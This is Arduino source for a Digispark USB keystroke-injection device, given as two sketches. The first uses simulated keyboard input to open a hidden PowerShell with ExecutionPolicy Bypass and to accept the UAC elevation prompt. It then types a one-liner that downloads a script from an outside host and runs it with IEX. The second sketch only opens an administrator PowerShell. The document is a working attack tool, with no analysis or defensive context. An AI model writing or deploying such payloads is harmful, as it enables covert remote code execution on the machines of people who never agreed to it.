#include "DigiKeyboard.h"

void setup()
{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -WindowStyle hidden"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('http://192.168.0.10/1.ps1') | IEX");
  DigiKeyboard.delay(1000);
}
void loop()
{
}





//just opening admin powershell (not hidden) 
#include "DigiKeyboard.h"

void setup()
{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  
  
  
 
}
void loop()
{
}
